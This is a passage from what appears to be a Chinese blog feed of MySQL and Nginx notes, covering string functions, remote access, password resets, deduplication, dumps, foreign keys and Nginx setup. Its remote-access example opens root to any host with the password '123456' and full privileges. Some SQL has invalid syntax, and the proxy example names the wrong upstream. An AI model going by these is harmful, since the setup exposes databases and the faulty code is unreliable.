class="language-bash">截取第二个<span class="string">&quot;.&quot;</span>之前的所有字符</span></span><br><span class="line">select substring_index(&#x27;www.test.com.cn&#x27;, &#x27;.&#x27;, 2);</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">| www.test |</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">截取倒数第二个<span class="string">&quot;.&quot;</span>之后的所有字符</span></span><br><span class="line">select substring_index(&#x27;www.test.com.cn&#x27;, &#x27;.&#x27;, -2);</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">| com.cn |</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果在字符串中找不到delim参数指定的值,就返回整个字符串</span></span><br><span class="line">select substring_index(&#x27;www.test.com.cn&#x27;, &#x27;.coc&#x27;, 1);</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">| www.test.com.cn |</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">截取某个字段数据的中间值</span></span><br><span class="line">select substring_index(substring_index(&quot;字段名&quot;, &#x27;,&#x27;, 2) , &#x27;,&#x27;, -1) from &quot;表名&quot;;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">| 2 |</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No43：MySQL远程连接</title>
      <link href="/posts/e982e146.html"/>
      <url>/posts/e982e146.html</url>
      
        <content type="html"><![CDATA[<ul><li>打开命令行</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用root登录</span></span><br><span class="line">mysql -uroot -p密码</span><br></pre></td></tr></table></figure><ul><li>创建远程访问用户</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">create user &#x27;用户名&#x27;@&#x27;IP地址&#x27; identified by &#x27;密码&#x27;;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">create user <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;%&#x27;</span> identified by <span class="string">&#x27;123456&#x27;</span>;</span></span><br></pre></td></tr></table></figure><ul><li>赋予用户最大权限</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grant all privileges on *.* to &#x27;用户名&#x27;@&#x27;IP地址&#x27; identified by &#x27;密码&#x27;;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">grant all privileges on *.* to <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;%&#x27;</span> identified by <span class="string">&#x27;123456&#x27;</span>;</span></span><br></pre></td></tr></table></figure><ul><li>刷新权限</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">flush privileges;</span><br></pre></td></tr></table></figure><ul><li>连接</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysql -h IP地址 -P 端口 -u远程访问用户 -p密码</span><br></pre></td></tr></table></figure><ul><li>连接不上可能出现的原因</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ERROR 1396 (HY000): Operation CREATE USER failed for &#x27;root&#x27;@&#x27;%&#x27;，说明已经存在该用户对应主机，可以直接赋予用户权限。</span><br><span class="line"></span><br><span class="line">ERROR 1045 (28000): Access denied for user &#x27;root&#x27;@&#x27;%&#x27; (using password: YES)，密码不对。</span><br><span class="line"></span><br><span class="line">防火墙阻挡远程连接数据库，关闭防火墙或允许连接MySQL。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No42：MySQL如何修改root用户的密码</title>
      <link href="/posts/f45bbe1d.html"/>
      <url>/posts/f45bbe1d.html</url>
      
        <content type="html"><![CDATA[<h3 id="方法1：用SET-PASSWORD命令"><a href="#方法1：用SET-PASSWORD命令" class="headerlink" title="方法1：用SET PASSWORD命令"></a>方法1：用SET PASSWORD命令</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash"><span class="built_in">set</span> password <span class="keyword">for</span> 用户名@localhost = password(<span class="string">&#x27;新密码&#x27;</span>);</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">举例</span></span><br><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash"><span class="built_in">set</span> password <span class="keyword">for</span> root@localhost = password(<span class="string">&#x27;123&#x27;</span>);</span></span><br></pre></td></tr></table></figure><h3 id="方法2：用mysqladmin"><a href="#方法2：用mysqladmin" class="headerlink" title="方法2：用mysqladmin"></a>方法2：用mysqladmin</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash">mysqladmin -u用户名 -p旧密码 password 新密码;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">举例</span></span><br><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash">mysqladmin -uroot -p123456 password 123;</span></span><br></pre></td></tr></table></figure><h3 id="方法3：用UPDATE直接编辑user表"><a href="#方法3：用UPDATE直接编辑user表" class="headerlink" title="方法3：用UPDATE直接编辑user表"></a>方法3：用UPDATE直接编辑user表</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash">use mysql;</span></span><br><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash">update user <span class="built_in">set</span> password=password(<span class="string">&#x27;123&#x27;</span>) <span class="built_in">where</span> user=<span class="string">&#x27;root&#x27;</span> and host=<span class="string">&#x27;localhost&#x27;</span>;</span></span><br><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash">flush privileges;</span></span><br></pre></td></tr></table></figure><h3 id="方法4：忘记root密码的时候"><a href="#方法4：忘记root密码的时候" class="headerlink" title="方法4：忘记root密码的时候"></a>方法4：忘记root密码的时候</h3><p>以windows为例：</p><ol><li><p>关闭正在运行的MySQL服务。</p></li><li><p>打开DOS窗口，转到mysql\bin目录。</p></li><li><p>输入mysqld –skip-grant-tables回车。–skip-grant-tables的意思是启动MySQL服务的时候跳过权限表认证。</p></li><li><p>再开一个DOS窗口（因为刚才那个DOS窗口已经不能动了），转到mysql\bin目录。</p></li><li><p>输入mysql回车，如果成功，将出现MySQL提示符&gt;</p></li><li><p>连接权限数据库：use mysql;</p></li><li><p>改密码：update user set password&#x3D;password(“123”) where user&#x3D;”root”;</p></li><li><p>刷新权限（必须步骤）：flush privileges;</p></li><li><p>退出：quit</p></li><li><p>注销系统，再进入，使用用户名root和刚才设置的新密码123登录。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No41：MySQL数据查重、去重的实现</title>
      <link href="/posts/5718e101.html"/>
      <url>/posts/5718e101.html</url>
      
        <content type="html"><![CDATA[<p>有一个表user，字段分别有id、nick_name、password、email、phone。</p><h3 id="一、单字段（nick-name）"><a href="#一、单字段（nick-name）" class="headerlink" title="一、单字段（nick_name）"></a>一、单字段（nick_name）</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查出所有有重复记录的所有记录</span></span><br><span class="line">select * from user where nick_name in (select nick_name from user group by nick_name having count(nick_name)&gt;1);</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查出有重复记录的各个记录组中<span class="built_in">id</span>最大的记录</span></span><br><span class="line">select * from user where id in (select max(id) from user group by nick_name having count(nick_name)&gt;1);</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查出多余的记录，不查出<span class="built_in">id</span>最小的记录</span></span><br><span class="line">select * from user where nick_name in (select nick_name from user group by nick_name having count(nick_name)&gt;1) and id not in (select min(id) from user group by nick_name having count(nick_name)&gt;1);</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除多余的重复记录，只保留<span class="built_in">id</span>最小的记录</span></span><br><span class="line">delete from user where nick_name in (select nick_name from (select nick_name from user group by nick_name having count(nick_name)&gt;1) as tmp1) and id not in (select id from (select min(id) from user group by nick_name having count(nick_name)&gt;1) as tmp2);</span><br></pre></td></tr></table></figure><h3 id="二、多字段（nick-name-password）"><a href="#二、多字段（nick-name-password）" class="headerlink" title="二、多字段（nick_name,password）"></a>二、多字段（nick_name,password）</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查出所有有重复记录的记录</span></span><br><span class="line">select * from user where (nick_name,password) in (select nick_name,password from user group by nick_name,password where having count(nick_name)&gt;1);</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查出有重复记录的各个记录组中<span class="built_in">id</span>最大的记录</span></span><br><span class="line">select * from user where id in (select max(id) from user group by nick_name,password where having count(nick_name)&gt;1);</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查出各个重复记录组中多余的记录数据，不查出<span class="built_in">id</span>最小的一条</span></span><br><span class="line">select * from user where (nick_name,password) in (select nick_name,password from user group by nick_name,password having count(nick_name)&gt;1) and id not in (select min(id) from user group by nick_name,password having count(nick_name)&gt;1);</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除多余的重复记录，只保留<span class="built_in">id</span>最小的记录</span></span><br><span class="line">delete from user where (nick_name,password) in (select nick_name,password from (select nick_name,password from user group by nick_name,password having count(nick_name)&gt;1) as tmp1) and id not in (select id from (select min(id) id from user group by nick_name,password having count(nick_name)&gt;1) as tmp2);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No40：MySQL数据导出与导入</title>
      <link href="/posts/af58fea5.html"/>
      <url>/posts/af58fea5.html</url>
      
        <content type="html"><![CDATA[<ul><li>导出</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">导出整个数据库</span></span><br><span class="line">mysqldump -u用户名 -p密码 数据库名称 &gt; 导出的路径和文件名</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">导出数据库一个表，包括表结构和数据</span></span><br><span class="line">mysqldump -u用户名 -p密码 数据库名 表名&gt; 导出的路径和文件名</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果需要导出数据中多张表的结构及数据时，表名用空格隔开</span></span><br><span class="line">mysqldump -u用户名 -p密码 数据库名 表名1 表名2 &gt; 导出的路径和文件名</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">仅导出数据库结构</span></span><br><span class="line">mysqldump -u用户名 -p密码 -d 数据库名 &gt; 导出的路径和文件名</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">仅导出表结构</span></span><br><span class="line">mysqldump -u用户名 -p密码 -d 数据库名 表名&gt; 导出的路径和文件名</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将语句查询出来的结果导出为.txt文件</span></span><br><span class="line">mysql -u 用户名 -p密码 数据库名 -e &quot;select * from 表名&quot; &gt; 导出的路径和文件名</span><br></pre></td></tr></table></figure><ul><li>导入</li></ul><p>第1种</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将备份的数据导入指定数据库</span></span><br><span class="line">mysql -uroot -p DBname &lt; xxx.sql</span><br></pre></td></tr></table></figure><p>第2种</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进入mysql数据库控制台</span></span><br><span class="line">mysql -u用户名 -p密码</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">选择要导入的数据库</span></span><br><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash">use 数据库</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用<span class="built_in">source</span>命令，后面参数SQL本文件</span></span><br><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash"><span class="built_in">source</span> xxx.sql</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No39：MySQL替换某个字段中的某个字符</title>
      <link href="/posts/5dafe14c.html"/>
      <url>/posts/5dafe14c.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">number             addr</span><br><span class="line">01             四川省成都市XXXXXX街道05号</span><br><span class="line">02             四川省成都市XXXXXX街道07号</span><br><span class="line">03             四川省成都市XXXXXX街道09号</span><br><span class="line">04             四川省成都市XXXXXX街道04号</span><br></pre></td></tr></table></figure><p>需求：addr字段里面的所有的值，都要把成都市改为天府市。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">number             addr</span><br><span class="line">01             四川省天府市XXXXXX街道05号</span><br><span class="line">02             四川省天府市XXXXXX街道07号</span><br><span class="line">03             四川省天府市XXXXXX街道09号</span><br><span class="line">04             四川省天府市XXXXXX街道04号</span><br></pre></td></tr></table></figure><p>解决方法：</p><p>sql语句：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">update 表名 set 字段名=REPLACE (字段名,&#x27;原来的值&#x27;,&#x27;要修改的值&#x27;);</span><br></pre></td></tr></table></figure><p>当然，也可以添加条件：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">update user_item set addr=REPLACE (addr,&#x27;成都&#x27;,&#x27;天府&#x27;) where time&lt;&#x27;2013-11--5&#x27;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No38：MySQL外键约束</title>
      <link href="/posts/c137cdbe.html"/>
      <url>/posts/c137cdbe.html</url>
      
        <content type="html"><![CDATA[<p>MySQL有两种常用的引擎类型：MyISAM和InnoDB。目前只有InnoDB引擎类型支持外键约束。</p><p>外键的使用需要满足下列的条件：</p><ul><li><p>两张表必须都是InnoDB表，并且它们没有临时表。</p></li><li><p>建立外键关系的对应列必须具有相似的InnoDB内部数据类型。</p></li><li><p>建立外键关系的对应列必须建立了索引。</p></li><li><p>假如显式的给出了CONSTRAINT symbol，那symbol在数据库中必须是唯一的。假如没有显式的给出，InnoDB会自动的创建。</p></li></ul><p>如果子表试图创建一个在父表中不存在的外键值，InnoDB会拒绝任何INSERT或UPDATE操作。</p><p>如果父表试图UPDATE或者DELETE任何子表中存在或匹配的外键值，最终动作取决于外键约束定义中的ON UPDATE和ON DELETE选项。</p><p>InnoDB支持5种不同的动作，如果没有指定ON DELETE或者ON UPDATE，默认的动作为RESTRICT:</p><ul><li><p>CASCADE:从父表中删除或更新对应的行，同时自动的删除或更新自表中匹配的行。ON DELETE CANSCADE和ON UPDATE<br>CANSCADE都被InnoDB所支持。</p></li><li><p>SET NULL:从父表中删除或更新对应的行，同时将子表中的外键列设为空。注意，这些在外键列没有被设为NOT NULL时才有效。ON DELETE<br>SET NULL和ON UPDATE SET SET NULL都被InnoDB所支持。</p></li><li><p>NO ACTION:InnoDB拒绝删除或者更新父表。</p></li><li><p>RESTRICT:拒绝删除或者更新父表。指定RESTRICT（或者NO ACTION）和忽略ON DELETE或者ON UPDATE选项的效果是一样的。</p></li><li><p>SET DEFAULT:InnoDB目前不支持。</p></li></ul><p>外键约束使用最多的两种情况无外乎：</p><ul><li><p>父表更新时子表也更新，父表删除时如果子表有匹配的项，删除失败；</p></li><li><p>父表更新时子表也更新，父表删除时子表匹配的项也删除。</p></li></ul><p>前一种情况，在外键定义中，我们使用ON UPDATE CASCADE ON DELETE RESTRICT；后一种情况，可以使用ON UPDATE CASCADE ON DELETE<br>CASCADE。</p><p>InnoDB允许你使用ALTER TABLE在一个已经存在的表上增加一个新的外键。</p><p>InnoDB也支持使用ALTER TABLE来删除外键。</p>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No37：Nginx安装方法</title>
      <link href="/posts/8824e2c8.html"/>
      <url>/posts/8824e2c8.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、CentOS7"><a href="#1、CentOS7" class="headerlink" title="1、CentOS7"></a>1、CentOS7</h3><ul><li>添加Nginx源</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rpm -Uvh http://nginx.org/packages/centos/7/noarch/RPMS/nginx-release-centos-7-0.el7.ngx.noarch.rpm</span><br></pre></td></tr></table></figure><ul><li>安装Nginx</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install -y nginx</span><br></pre></td></tr></table></figure><ul><li>启动Nginx并设置开机自动运行</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动服务</span></span><br><span class="line">systemctl start nginx</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">停止服务</span></span><br><span class="line">systemctl stop nginx</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启服务</span></span><br><span class="line">systemctl restart nginx</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">服务状态</span></span><br><span class="line">systemctl status nginx</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开机启动</span></span><br><span class="line">systemctl enable nginx</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重载服务配置</span></span><br><span class="line">systemctl daemon-reload</span><br></pre></td></tr></table></figure><ul><li>查看安装位置</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">whereis nginx</span><br></pre></td></tr></table></figure><p>默认配置文件路径：</p><p>配置文件：&#x2F;etc&#x2F;nginx&#x2F;</p><p>日志文件：&#x2F;var&#x2F;log&#x2F;nginx</p><p>服务启动脚本：&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;nginx.service</p><ul><li>查看修改配置文件</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/nginx/nginx.conf</span><br></pre></td></tr></table></figure><ul><li>卸载</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">停止服务</span></span><br><span class="line">systemctl stop nginx</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除安装的包</span></span><br><span class="line">yum erase $(rpm -qa | grep nginx)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除配置文件</span></span><br><span class="line">rm -rf /etc/nginx/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除日志文件</span></span><br><span class="line">rm -rf /var/log/nginx</span><br></pre></td></tr></table></figure><h3 id="2、Ubuntu16-04"><a href="#2、Ubuntu16-04" class="headerlink" title="2、Ubuntu16.04"></a>2、Ubuntu16.04</h3><ul><li>安装</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install nginx</span><br></pre></td></tr></table></figure><ul><li>启动</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/etc/init.d/nginx start</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No36：Nginx常用配置和技巧</title>
      <link href="/posts/82bde39d.html"/>
      <url>/posts/82bde39d.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、一个站点配置多个域名"><a href="#1、一个站点配置多个域名" class="headerlink" title="1、一个站点配置多个域名"></a>1、一个站点配置多个域名</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen   80;</span><br><span class="line">    server_name ops-coffee.cn b.ops-coffee.cn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>server_name 后跟多个域名即可，多个域名之间用空格分隔。</p><h3 id="2、一个站点配置多个域名"><a href="#2、一个站点配置多个域名" class="headerlink" title="2、一个站点配置多个域名"></a>2、一个站点配置多个域名</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen   80;</span><br><span class="line">    server_name a.ops-coffee.cn;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        root /home/project/pa;</span><br><span class="line">        index index.html;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    server_name  ops-coffee.cn b.ops-coffee.cn;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        root /home/project/pb;</span><br><span class="line">        index index.html;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    server_name  c.ops-coffee.cn;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        root /home/project/pc;</span><br><span class="line">        index index.html;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3、基于Nginx虚拟主机配置实现"><a href="#3、基于Nginx虚拟主机配置实现" class="headerlink" title="3、基于Nginx虚拟主机配置实现"></a>3、基于Nginx虚拟主机配置实现</h3><p>Nginx有三种类型的虚拟主机</p><ul><li><p>基于IP的虚拟主机：需要你的服务器上有多个地址，每个站点对应不同的地址，这种方式使用的比较少。</p></li><li><p>基于端口的虚拟主机：每个站点对应不同的端口，访问的时候使用ip:port的方式访问，可以修改listen的端口来使用。</p></li><li><p>基于域名的虚拟主机：使用最广的方式，上边例子中就是用了基于域名的虚拟主机，前提条件是你有多个域名分别对应每个站点，server_name填写不同的域名即可。</p></li></ul><h3 id="4、nginx添加账号密码验证"><a href="#4、nginx添加账号密码验证" class="headerlink" title="4、nginx添加账号密码验证"></a>4、nginx添加账号密码验证</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    location / &#123;</span><br><span class="line">        auth_basic &quot;please input user&amp;passwd&quot;;</span><br><span class="line">        auth_basic_user_file key/auth.key;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5、nginx开启列目录"><a href="#5、nginx开启列目录" class="headerlink" title="5、nginx开启列目录"></a>5、nginx开启列目录</h3><p>当你想让nginx作为文件下载服务器存在时，需要开启nginx列目录</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    location download &#123;</span><br><span class="line">        autoindex on;</span><br><span class="line">        autoindex_exact_size off;</span><br><span class="line">        autoindex_localtime on;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>autoindex_exact_size：为on(默认)时显示文件的确切大小，单位是byte；改为off显示文件大概大小，单位KB或MB或GB。</p><p>autoindex_localtime：为off(默认)时显示的文件时间为GMT时间；改为on后，显示的文件时间为服务器时间。</p><p>默认当访问列出的txt等文件时会在浏览器上显示文件的内容，如果你想让浏览器直接下载，加上下边的配置。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">if ($request_filename ~* ^.*?\.(txt|pdf|jpg|png)$) &#123;</span><br><span class="line">    add_header Content-Disposition &#x27;attachment&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6、配置默认站点"><a href="#6、配置默认站点" class="headerlink" title="6、配置默认站点"></a>6、配置默认站点</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80 default;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当一个nginx服务上创建了多个虚拟主机时默认会从上到下查找，如果匹配不到虚拟主机则会返回第一个虚拟主机的内容。</p><p>如果你想指定一个默认站点时，可以将这个站点的虚拟主机放在配置文件中第一个虚拟主机的位置，或者在这个站点的虚拟主机上配置listen<br>default。</p><h3 id="7、不允许通过IP访问"><a href="#7、不允许通过IP访问" class="headerlink" title="7、不允许通过IP访问"></a>7、不允许通过IP访问</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       80 default;</span><br><span class="line">    server_name  _;</span><br><span class="line">    return      404;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可能有一些未备案的域名或者你不希望的域名将服务器地址指向了你的服务器，这时候就会对你的站点造成一定的影响，需要禁止IP或未配置的域名访问，我们利用上边所说的default规则，将默认流量都转到404去。</p><p>上边这个方法比较粗暴，当然你也可以配置下所有未配置的地址访问时直接301重定向到你的网站去，也能为你的网站带来一定的流量。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    rewrite ^/(.*)$ https://ops-coffee.cn/$1 permanent;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="8、直接返回验证文件"><a href="#8、直接返回验证文件" class="headerlink" title="8、直接返回验证文件"></a>8、直接返回验证文件</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">location = /XDFyle6tNA.txt &#123;</span><br><span class="line">    default_type text/plain;</span><br><span class="line">    return 200 &#x27;d6296a84657eb275c05c31b10924f6ea&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很多时候微信等程序都需要我们放一个txt的文件到项目里以验证项目归属，我们可以直接通过上边这种方式修改nginx即可，无需真正的把文件给放到服务器上。</p><h3 id="9、nginx配置upstream反向代理"><a href="#9、nginx配置upstream反向代理" class="headerlink" title="9、nginx配置upstream反向代理"></a>9、nginx配置upstream反向代理</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http &#123;</span><br><span class="line">    ...</span><br><span class="line">    upstream tomcats &#123;</span><br><span class="line">        server 192.168.106.176 weight=1;</span><br><span class="line">        server 192.168.106.177 weight=1;</span><br><span class="line">    &#125;</span><br><span class="line">    server &#123;</span><br><span class="line">        location /ops-coffee/ &#123;</span><br><span class="line">            proxy_pass http://test;</span><br><span class="line">            proxy_set_header Host $host;</span><br><span class="line">            proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">            proxy_set_header X-Forwarded-Proto $scheme;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&lt;proxy_pass <a href="http://test/">http://test</a>与&lt;proxy_pass <a href="http://test/">http://test/</a>的区别，分为以下两种情况：</p><ul><li>目标地址中不带uri，&lt;proxy_pass <a href="http://test/">http://test</a>&gt;，此时新的目标url中，匹配的uri部分不做修改，原来是什么就是什么。</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">location /ops-coffee/ &#123;</span><br><span class="line">    proxy_pass  http://192.168.106.135:8181;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">结果</span></span><br><span class="line">http://domain/ops-coffee/            --&gt;     http://192.168.106.135:8181/ops-coffee/</span><br><span class="line">http://domain/ops-coffee/action/abc  --&gt;     http://192.168.106.135:8181/ops-coffee/action/abc</span><br></pre></td></tr></table></figure><ul><li>目标地址中带uri（“&#x2F;”也是uri），&lt;proxy_pass <a href="http://test/">http://test/</a>&gt;，此时新的目标url中，匹配的uri部分将会被修改为该参数中的uri。</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">location /ops-coffee/ &#123;</span><br><span class="line">    proxy_pass  http://192.168.106.135:8181/;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">结果</span></span><br><span class="line">http://domain/ops-coffee/            --&gt;     http://192.168.106.135:8181</span><br><span class="line">http://domain/ops-coffee/action/abc  --&gt;     http://192.168.106.135:8181/action/abc</span><br></pre></td></tr></table></figure><h3 id="10、nginx配置upstream开启keepalive"><a href="#10、nginx配置upstream开启keepalive" class="headerlink" title="10、nginx配置upstream开启keepalive"></a>10、nginx配置upstream开启keepalive</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http &#123;</span><br><span class="line">    